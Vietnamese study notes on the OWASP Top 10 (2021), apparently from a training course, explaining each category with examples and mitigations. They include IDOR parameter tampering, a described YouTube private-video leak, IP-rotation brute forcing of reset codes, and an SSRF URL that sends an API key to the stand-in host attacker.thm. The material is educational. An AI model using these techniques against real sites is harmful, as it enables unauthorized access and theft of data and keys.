# TOP 10 OWASP 2021

## 1. Broken Access Control

- Trên các trang web có những trang được vệ khỏi những người truy cập thường xuyên. Ví dụ, chỉ người dùng quản trị của trang web mới có thể truy cập vào trang quản lý những người dùng khác. Nhưng nếu một người bình thường truy cập trang web và có thể truy cập vào trang được bảo vệ mà họ không được phép xem thì ta có thể nói đây là một lỗi broken access control.

- Broken access control cho phép kẻ tấn công bỏ qua quyền hạn cho phép chúng xem dữ liệu nhạy cảm và thực hiện các nghiệm vụ mà chúng không được phép làm.

- Ví dụ về lỗ hổng của YouTube năm 2019 về việc một người dùng khác có thể lấy được video private của bạn (từng khung hình một). Kẻ tân công có thể sử dụng dịch vụ Google Ads, đây là sản phẩm mà các nhà quảng cáo sử dụng để tạo quảng cáo trên tất cả các dịch vụ của Google, bao gồm cả YouTube. Các quảng cáo sẽ được các nhàn quảng cáo thiết lập tại đây trên nền tảng Google Ads.

  - Có một trang tên là Video, nơi có thể xem các video được quảng cá sử dụng. Nhấp vào sẽ mở ra danh sách các mục chọn mục Analytics, đây là nơi dành cho các phần video cụ thể. Có một tính năng thú vị là Moments cho phép các nhà quảng cáo đánh dấu các khoảnh khác cụ thể của video. Khi đánh dấu một khoảnh khắc thì trên Burp Suite ghi nhận một request POST được gửi tới một endpoin là /GetThumbnails:
 
  ![image](https://github.com/user-attachments/assets/af84e189-4530-4acb-9e0e-715f2086d720)
  - Ta có thể thấy được trong tham số _ar, 1 là ID của video, 2 là thời gian khoảnh khắc được tính bằng mili giây. Response nhận được là hình ảnh được mã hóa bằng base64, là hình thu nhỏ được hiển thị bởi quảng cáo.
 
  - Thực hiện thay ID bằng ID của một video private và response nhận về là hình ảnh mã hóa base64 của video private đó. Nếu video ở chế độ 24FPS thì một khung hình sẽ ở trên màn hình trong 33 mili giây vì vậy kẻ tân công có thể viết một đoạn mã python để tải lần lượt từng bức ảnh xuống bắt đầu từ 0 mỗi bức ảnh cách nhau 33 mili giây. Thế là kẻ tấn công sẽ lấy được video private tuy chất lượng hình ảnh không cao nhưng đủ để nhìn thấy mọi thứ diễn ra.

- IDOR  hay Insecure Direct Object Reference đề cập đến lỗ hổng kiểm soát truy cập, nơi bạn có thể truy cập vào các tài nguyên mà thông thường bạn không thể nhìn thấy. Điều này xảy ra khi lập trình viên để lộ Direct Object Reference, đây chỉ là một mã định danh tham chiếu đến các đối tượng cụ thể trong máy chủ.

- Ví dụ chúng ta đăng nhập vào một tài khoản ngân hàng và chúng ta được đưa đến một url `https://bank.thm/account?id=111111`

![image](https://github.com/user-attachments/assets/76ed41ac-e07e-4512-9396-b78f32f0c3a2)

- Mọi thứ nhìn trông khá bình thường nhưng chúng ta để ý đến tham số id nếu thay đổi id đo thành 22222 thì sao, nếu trang wweb không được cài đặt đúng cách thì người đó sẽ có thể truy cập vào thông tin ngân hàng của người khác:

![image](https://github.com/user-attachments/assets/5debb8e1-749b-49ad-bb81-4bd94752efeb)


## 2. Cryptographic Failures

- Lỗi mật mã đề cập đến bất kỳ lỗ hổng nào phát sinh do việc sử dụng sai (hoặc không sử dụng) các thuật toán mật mã để bảo vệ thông tin nhạy cảm. Các ứng dụng web yêu cầu mật mã để cung cấp tính bảo mật cho người dùng ở nhiều cấp độ.

- Ví dụ, hãy lấy một ứng dụng email an toàn:

  - Khi bạn truy cập tài khoản email của mình bằng trình duyệt, bạn muốn chắc chắn rằng thông tin liên lạc giữa bạn và máy chủ được mã hóa. Theo cách đó, bất kỳ kẻ nghe lén nào cố gắng bắt các gói tin mạng của bạn sẽ không thể khôi phục nội dung địa chỉ email của bạn. Khi chúng tôi mã hóa lưu lượng mạng giữa máy khách và máy chủ, chúng tôi thường gọi đây là ***mã hóa dữ liệu khi truyền*** .

  - Vì email của bạn được lưu trữ trên một số máy chủ do nhà cung cấp của bạn quản lý, nên nhà cung cấp email cũng mong muốn không thể đọc email của khách hàng. Vì mục đích này, email của bạn cũng có thể được mã hóa khi lưu trữ trên máy chủ. Điều này được gọi là ***mã hóa dữ liệu khi lưu trữ*** .

### Supporting Material 1

- Cơ sở dữ liệu được thiết lập trên các máy chủ chuyên dụng chạy dịch vụ cơ sở dữ liệu như MySQL hoặc MariaDB; tuy nhiên, cơ sở dữ liệu cũng có thể được lưu trữ dưới dạng tệp. Chúng được gọi là cơ sở dữ liệu "flat-file" vì chúng được lưu trữ dưới dạng một tệp duy nhất trên máy tính.

- Định dạng phổ biến nhất (và đơn giản nhất) của cơ sở dữ liệu tệp phẳng là cơ sở dữ liệu SQLite. Chúng có thể được tương tác với hầu hết các ngôn ngữ lập trình và có một máy khách chuyên dụng để truy vấn chúng trên dòng lệnh. Máy khách này được gọi sqlite3và được cài đặt trên nhiều bản phân phối Linux theo mặc định.

- Để truy cập vào nó, chúng ta sử dụng  sqlite3 <database-name>:

![image](https://github.com/user-attachments/assets/bbec9e30-fc7a-4695-8049-18c909227d8c)

- Từ đây, chúng ta có thể xem các bảng trong cơ sở dữ liệu bằng cách sử dụng  .tables:

![image](https://github.com/user-attachments/assets/b4d2ee26-66cd-4e2a-97ef-576ddd1885ee)

- Tại thời điểm này ta có thể dùng các câu lenhj sql để xem thông tin từ bảng:

![image](https://github.com/user-attachments/assets/32f14fdb-e96d-43c0-839b-abd12066d8eb)


### Supporting Material 2

- Các mật khẩu thường được hash trước khi lưu vào cơ sở dữ liệu nhưng nếu thuật toán hash được sủ dụng yếu hoặc mật khẩu quá dễ thì kẻ tấn công hoàn toàn có thể crack được mật khẩu đã lưu ở dạng hash về dạng plain text

## 3. Injection

- Injection rất phổ biến trong các ứng dụng ngày nay. Những lỗi này xảy ra vì ứng dụng diễn giải dữ liệu đầu vào do người dùng kiểm soát thành lệnh hoặc tham số. Các cuộc tấn công tiêm phụ thuộc vào công nghệ được sử dụng và cách các công nghệ này diễn giải dữ liệu đầu vào. Một số ví dụ phổ biến bao gồm:
  
  - SQL Injection
 
  - Command Injection
 
  - Cross Site Scripting (XSS) ...

- Ví dụ về một lỗ hổng Cammand Injection:

![image](https://github.com/user-attachments/assets/f30babb8-c19d-46d2-8d10-a324dffe743f)

- Ta thấy được các dữ liệu đầu vào không được lọc mà đưa thảng vào hàm thực thi của php `pasthru()` điều này dẫn đến việc kẻ tấn công có thể thực hiện các câu lệnh nguy hiển trên hệ thống và RCE hệ thống.

## 4. Insecure Design

- Insecure Design đề cập đến các lỗ hổng vốn có trong kiến ​​trúc của ứng dụng. Chúng không phải là lỗ hổng liên quan đến việc triển khai hoặc cấu hình kém, nhưng ý tưởng đằng sau toàn bộ ứng dụng (hoặc một phần của ứng dụng) bị lỗi ngay từ đầu. Hầu hết thời gian, các lỗ hổng này xảy ra khi mô hình hóa mối đe dọa không phù hợp được thực hiện trong giai đoạn lập kế hoạch của ứng dụng và lan truyền cho đến tận ứng dụng cuối cùng của bạn. Đôi khi, các lỗ hổng thiết kế không an toàn cũng có thể được các nhà phát triển đưa vào khi thêm một số "phím tắt" xung quanh mã để giúp việc thử nghiệm của họ dễ dàng hơn. 

- Ví dụ về việc đặt lại mật khẩu không an toàn trên Intagram:
  
  -  Instagram cho phép người dùng đặt lại mật khẩu đã quên bằng cách gửi cho họ mã 6 chữ số đến số điện thoại di động của họ qua SMS để xác thực. Nếu kẻ tấn công muốn truy cập vào tài khoản của nạn nhân, hắn có thể thử dùng brute-force mã 6 chữ số. Như dự kiến, điều này không thể thực hiện trực tiếp vì Instagram đã triển khai giới giới hạn 250 lần thử.
 
  -  Tuy nhiên giới hạn này chỉ áp dụng cho một địa chỉ IP. Vì vậy kẻ tấn công có thể sử dụng một lượng lớn IP để thực hiện brute force SMS. 6 Số yêu cầu một lượng lớn IP khoảng 4000 địa chỉ, với các dịch vụ đám may sẽ gipws kẻ tấn công dễ dàng có được với chi phí thấp.
    

## 5. Security Misconfiguration

- Security Misconfiguration khác só với các lỗ hổng khác trong top 10 vì nó xẩy ra khi nó có thể được cấu hình an toàn nhưng việc đó lại không được thực hiện.

- Câu hình bảo mật không đúng bao gồm:

    - Cấu hình quyền kém trên các dịch vụ đám mây.
 
    - Bật các tính năng không cần thiết như services, pages, accounts hoặc privileges
 
    - Tài khoản mặc định không đổi mật khẩu
 
    - Các thông báo lỗi quá chi tiết.
 
    - Không sử dụng HTTP Secure Header.


## 6. Vulnerable and Outdated Components

- Là việc phiên bản công nghệ mà họ sử dụng đã lỗi thồi và tồn tại các lỗ hổng đã biết.

- Ví dụ hãy cùng xem xét điều đó với một ứng dụng web:

![image](https://github.com/user-attachments/assets/2faf5f66-745e-4b7a-8417-64846ce47a66)

- Ta thấy được phiên bản và tên phần mềm của máy chủ web. Ta thực hiện tra nó trên Exploit-DB và phát hiện nó có một khai thác:

![image](https://github.com/user-attachments/assets/6b4b1427-adf9-4e80-9951-19652ef1079f)

- Ta tiến hành chạy mã khai thác đối với mục tiêu:

![image](https://github.com/user-attachments/assets/f2742257-2f2d-4433-b2e2-fa7f87ca2388)

- Như vậy chúng ta đã có RCE tới mục tiêu.

## 7. Indentification and Authentication Failures 

- Xác thực và quản lý phiên tạo nên các thành phần cốt lõi của các ứng dụng web hiện đại. Xác thực cho phép người dùng truy cập vào các ứng dụng web bằng cách xác minh danh tính của họ. Hình thức xác thực phổ biến nhất là sử dụng cơ chế tên người dùng và mật khẩu. Người dùng sẽ nhập các thông tin xác thực này và máy chủ sẽ xác minh chúng. Sau đó, máy chủ sẽ cung cấp cho trình duyệt của người dùng một cookie phiên nếu chúng đúng. Cookie phiên là cần thiết vì máy chủ web sử dụng HTTP(S) để giao tiếp, không có trạng thái. Việc đính kèm cookie phiên có nghĩa là máy chủ sẽ biết ai đang gửi dữ liệu nào. Sau đó, máy chủ có thể theo dõi các hành động của người dùng. 

- Nếu kẻ tấn công có thể tìm ra lỗi trong cơ chế xác thực, chúng có thể thành công trong việc truy cập vào tài khoản của người dùng khác. Điều này sẽ cho phép kẻ tấn công truy cập vào dữ liệu nhạy cảm (tùy thuộc vào mục đích của ứng dụng). Một số lỗi phổ biến trong cơ chế xác thực bao gồm:

  - Tấn công bằng cách dùng vũ lực: Nếu ứng dụng web sử dụng tên người dùng và mật khẩu, kẻ tấn công có thể thử khởi chạy các cuộc tấn công bằng vũ lực cho phép chúng đoán tên người dùng và mật khẩu bằng nhiều lần xác thực.
    
  - Sử dụng thông tin xác thực yếu:  Các ứng dụng web nên thiết lập chính sách mật khẩu mạnh. Nếu các ứng dụng cho phép người dùng đặt mật khẩu như "password1" hoặc mật khẩu thông thường, kẻ tấn công có thể dễ dàng đoán được chúng và truy cập vào tài khoản người dùng.
    
  - Cookie phiên yếu: Cookie phiên là cách máy chủ theo dõi người dùng. Nếu cookie phiên chứa các giá trị có thể dự đoán được, kẻ tấn công có thể đặt cookie phiên của riêng chúng và truy cập vào tài khoản của người dùng. 

- Có thể có nhiều biện pháp giảm thiểu khác nhau cho cơ chế xác thực bị hỏng tùy thuộc vào lỗi cụ thể:

  - Để tránh các cuộc tấn công đoán mật khẩu, hãy đảm bảo ứng dụng áp dụng chính sách mật khẩu mạnh.
    
  - Để tránh các cuộc tấn công bằng brute force, hãy đảm bảo rằng ứng dụng thực hiện khóa tự động sau một số lần thử nhất định. Điều này sẽ ngăn chặn kẻ tấn công thực hiện thêm các cuộc tấn công bằng brute force.
    
  - Triển khai Xác thực đa yếu tố. Nếu người dùng có nhiều phương pháp xác thực, ví dụ, sử dụng tên người dùng và mật khẩu và nhận mã trên thiết bị di động của họ, kẻ tấn công sẽ khó có thể lấy được cả mật khẩu và mã để truy cập vào tài khoản.


## 8. Software and Data Integrity Failures

- Khi nói về tính toàn vẹn, chúng ta đề cập đến khả năng chúng ta có để xác định rằng một phần dữ liệu vẫn không bị sửa đổi. Tính toàn vẹn là điều cần thiết trong an ninh mạng vì chúng ta quan tâm đến việc duy trì dữ liệu quan trọng không bị sửa đổi không mong muốn hoặc có mục đích xấu. Ví dụ, giả sử bạn đang tải xuống trình cài đặt mới nhất cho một ứng dụng. Làm sao bạn có thể chắc chắn rằng khi tải xuống, nó không bị sửa đổi trong quá trình truyền tải hoặc bằng cách nào đó bị hỏng do lỗi truyền tải?

- Để khắc phục vấn đề này, bạn thường sẽ thấy một hàm băm  được gửi kèm theo tệp để bạn có thể chứng minh rằng tệp bạn đã tải xuống vẫn giữ nguyên tính toàn vẹn và không bị sửa đổi trong quá trình truyền tải. Hàm băm hoặc bản tóm tắt chỉ đơn giản là một con số thu được từ việc áp dụng một thuật toán cụ thể trên một phần dữ liệu. Khi đọc về các thuật toán băm, bạn thường sẽ đọc về MD5 , SHA1, SHA256 hoặc nhiều thuật toán khác có sẵn.

- Lỗ hổng này phát sinh từ mã hoặc cơ sở hạ tầng sử dụng phần mềm hoặc dữ liệu mà không sử dụng bất kỳ loại kiểm tra tính toàn vẹn nào. Vì không có xác minh tính toàn vẹn nào được thực hiện, kẻ tấn công có thể sửa đổi phần mềm hoặc dữ liệu được truyền đến ứng dụng, dẫn đến hậu quả không mong muốn. Về cơ bản có hai loại lỗ hổng trong danh mục này:

  - Lỗi toàn vẹn phần mềm
    
    - Giả sử bạn có một trang web sử dụng các thư viện của bên thứ ba được lưu trữ trên một số máy chủ bên ngoài nằm ngoài tầm kiểm soát của bạn. Lấy jQuery làm ví dụ, một thư viện javascript thường được sử dụng. Nếu muốn, bạn có thể đưa jQuery vào trang web của mình trực tiếp từ máy chủ của họ mà không cần tải xuống bằng cách đưa dòng sau vào mã HTML của trang web:
   
  ![image](https://github.com/user-attachments/assets/67c0a870-3826-492c-bbdc-7638d1220f2b)

    - Khi người dùng điều hướng đến trang web của bạn, trình duyệt của họ sẽ đọc mã HTML và tải xuống jQuery từ nguồn bên ngoài được chỉ định.
      
  ![image](https://github.com/user-attachments/assets/361e05ed-f797-4834-b9fa-0a14e2c0e79c)

    - Vấn đề là nếu kẻ tấn công bằng cách nào đó hack vào kho lưu trữ chính thức của jQuery, chúng có thể thay đổi nội dung `https://code.jquery.com/jquery-3.6.1.min.js` để chèn mã độc. Do đó, bất kỳ ai truy cập trang web của bạn giờ đây sẽ kéo mã độc và thực thi nó vào trình duyệt của họ mà không hề hay biết. Đây là lỗi toàn vẹn phần mềm vì trang web của bạn không kiểm tra thư viện của bên thứ ba để xem nó có thay đổi hay không. Các trình duyệt hiện đại cho phép bạn chỉ định một hàm băm dọc theo URL của thư viện để mã thư viện chỉ được thực thi nếu hàm băm của tệp đã tải xuống khớp với giá trị mong đợi. Cơ chế bảo mật này được gọi là Toàn vẹn tài nguyên phụ (SRI
  
    - Cách đúng để chèn thư viện vào mã HTML của bạn là sử dụng SRI và bao gồm một hàm băm toàn vẹn để nếu bằng cách nào đó kẻ tấn công có thể sửa đổi thư viện, bất kỳ máy khách nào điều hướng qua trang web của bạn sẽ không thực thi phiên bản đã sửa đổi. Sau đây là cách nó sẽ trông như thế nào trong HTML:
 
  ![image](https://github.com/user-attachments/assets/d900a249-0760-47ec-a2ad-bb978dc61064)

  - Lỗi toàn vẹn dữ liệu

    - Thông thường, khi người dùng đăng nhập vào ứng dụng, họ sẽ được chỉ định một số loại mã thông báo phiên cần được lưu trên trình duyệt trong suốt thời gian phiên diễn ra. Mã thông báo này sẽ được lặp lại trong mỗi yêu cầu tiếp theo để ứng dụng web biết chúng ta là ai. Các mã thông báo phiên này có thể có nhiều dạng nhưng thường được chỉ định thông qua cookie. Cookie là cặp khóa-giá trị mà ứng dụng web sẽ lưu trữ trên trình duyệt của người dùng và sẽ tự động được lặp lại trong mỗi yêu cầu đến trang web đã phát hành chúng.

    - Nếu các yêu cầu sau đăng nhập luôn gửi kèm cookie có chứa tên người dùng để biết rằng ai đang kết nối thì đây là một ý tưởng tồi về bảo mật. Người dùng hoàn toàn có thể thay đổi giá trị của cookie.
   
    - Một giải pháp cho vấn đề này là sử dụng một số cơ chế bảo toàn tính toàn vẹn của cookie như sử dụng JWT ( JSON Web Tokens).
   
    - JWT là các token rất đơn giản cho phép bạn lưu trữ các cặp khóa-giá trị trên một token cung cấp tính toàn vẹn như một phần của token. Ý tưởng là bạn có thể tạo ra các token mà bạn có thể cung cấp cho người dùng của mình với sự chắc chắn rằng họ sẽ không thể thay đổi các cặp khóa-giá trị và vượt qua kiểm tra tính toàn vẹn. Cấu trúc của token JWT được hình thành từ 3 phần:

  ![image](https://github.com/user-attachments/assets/64019d80-f1a6-417b-8d68-0ec77c1bca1f)

    - Tiêu đề chứa siêu dữ liệu cho biết đây là JWT và thuật toán ký được sử dụng là HS256. Tải trọng chứa các cặp khóa-giá trị với dữ liệu mà ứng dụng web muốn máy khách lưu trữ. Chữ ký tương tự như hàm băm, được sử dụng để xác minh tính toàn vẹn của tải trọng. Nếu bạn thay đổi tải trọng, ứng dụng web có thể xác minh rằng chữ ký sẽ không khớp với tải trọng và biết rằng bạn đã can thiệp vào JWT. Không giống như hàm băm đơn giản, chữ ký này liên quan đến việc sử dụng khóa bí mật chỉ do máy chủ nắm giữ, điều này có nghĩa là nếu bạn thay đổi tải trọng, bạn sẽ không thể tạo chữ ký khớp trừ khi bạn biết khóa bí mật. 


## 9. Security Logging and Monitoring Failures

- Khi thiết lập ứng dụng web, mọi hành động do người dùng thực hiện đều phải được ghi lại. Ghi lại rất quan trọng vì trong trường hợp xảy ra sự cố, các hoạt động của kẻ tấn công có thể được theo dõi. Khi các hành động của chúng được theo dõi, rủi ro và tác động của chúng có thể được xác định. Nếu không có ghi lại, sẽ không có cách nào để biết những hành động nào đã được kẻ tấn công thực hiện nếu chúng có quyền truy cập vào các ứng dụng web cụ thể. Những tác động quan trọng hơn của những điều này bao gồm:

  - Thiệt hại theo quy định: nếu kẻ tấn công có được quyền truy cập vào thông tin nhận dạng cá nhân của người dùng và không có hồ sơ nào về việc này, người dùng cuối cùng sẽ bị ảnh hưởng và chủ sở hữu ứng dụng có thể phải chịu tiền phạt hoặc các hành động nghiêm khắc hơn tùy thuộc vào quy định.

  - Nguy cơ bị tấn công thêm: sự hiện diện của kẻ tấn công có thể không bị phát hiện nếu không ghi nhật ký. Điều này có thể cho phép kẻ tấn công thực hiện thêm các cuộc tấn công vào chủ sở hữu ứng dụng web bằng cách đánh cắp thông tin đăng nhập, tấn công cơ sở hạ tầng, v.v.
 
- Các thông tin cần được lưu lại trong logs :

  - HTTP status codes

  - Time Stamps

  - Usernames

  - API endpoints/page locations

  - IP addresses

- Các nhật ký này có một số thông tin nhạy cảm, vì vậy điều quan trọng là phải đảm bảo chúng được lưu trữ an toàn và lưu trữ nhiều bản sao của các nhật ký này ở nhiều vị trí khác nhau.

- Việc ghi logs cực kỳ quan trong đặc biệt khi xảy ra các vi phạm hoặc có sự cố xảy ra.

## 10. Server-Side Request Forgery
 
 - Loại lỗ hổng này xảy ra khi kẻ tấn công có thể ép buộc ứng dụng web gửi yêu cầu thay mặt chúng đến các đích tùy ý trong khi vẫn kiểm soát được nội dung của chính yêu cầu đó. Lỗ hổng SSRF thường phát sinh từ các triển khai mà ứng dụng web của chúng ta cần sử dụng các dịch vụ của bên thứ ba.

- Ví dụ, hãy nghĩ đến một ứng dụng web sử dụng API bên ngoài để gửi thông báo SMS đến khách hàng của mình. Đối với mỗi email, trang web cần thực hiện yêu cầu web đến máy chủ của nhà cung cấp SMS để gửi nội dung của tin nhắn cần gửi. Vì nhà cung cấp SMS tính phí theo tin nhắn nên họ yêu cầu bạn thêm khóa bí mật mà họ chỉ định trước cho bạn vào mỗi yêu cầu bạn thực hiện với API của họ . Khóa API đóng vai trò là mã thông báo xác thực và cho phép nhà cung cấp biết phải tính phí cho ai cho mỗi tin nhắn. Ứng dụng sẽ hoạt động như sau:

![image](https://github.com/user-attachments/assets/cd451911-b147-4d15-a60c-3674f8e59e25)

-  Bạn có thể dễ dàng thấy lỗ hổng nằm ở đâu. Ứng dụng sẽ tiết lộ tham số server cho người dùng, tham số này định nghĩa tên máy chủ của nhà cung cấp dịch vụ SMS. Nếu kẻ tấn công muốn, chúng có thể chỉ cần thay đổi giá trị của tham số server trỏ đến máy mà chúng kiểm soát và ứng dụng web của bạn sẽ vui vẻ chuyển tiếp yêu cầu SMS đến kẻ tấn công thay vì nhà cung cấp SMS. Là một phần của tin nhắn được chuyển tiếp, kẻ tấn công sẽ lấy được khóa API, cho phép chúng sử dụng dịch vụ SMS để gửi tin nhắn với chi phí của bạn. Để đạt được điều này, kẻ tấn công chỉ cần thực hiện yêu cầu sau đến trang web của bạn: `https://www.mysite.com/sms?server=attacker.thm&msg=ABC`

- Điều này sẽ khiến ứng dụng web dễ bị tấn công đưa ra yêu cầu: `https://attacker.thm/api/send?msg=ABC` và lắng nghe trên Netcat:

![image](https://github.com/user-attachments/assets/ed30049f-8f95-4993-a31e-d2d3b82ee4a5)
 
- Đây là một trường hợp thực sự cơ bản của SSRF . Nếu điều này không có vẻ đáng sợ, SSRF thực sự có thể được sử dụng để làm nhiều hơn thế nữa. Nhìn chung, tùy thuộc vào các chi tiết cụ thể của từng kịch bản, SSRF có thể được sử dụng cho:

  - Liệt kê các mạng nội bộ, bao gồm địa chỉ IP và cổng.

  - Lợi dụng mối quan hệ tin cậy giữa các máy chủ và truy cập vào các dịch vụ bị hạn chế.

  - Tương tác với một số dịch vụ không phải HTTP để thực thi mã từ xa ( RCE ).
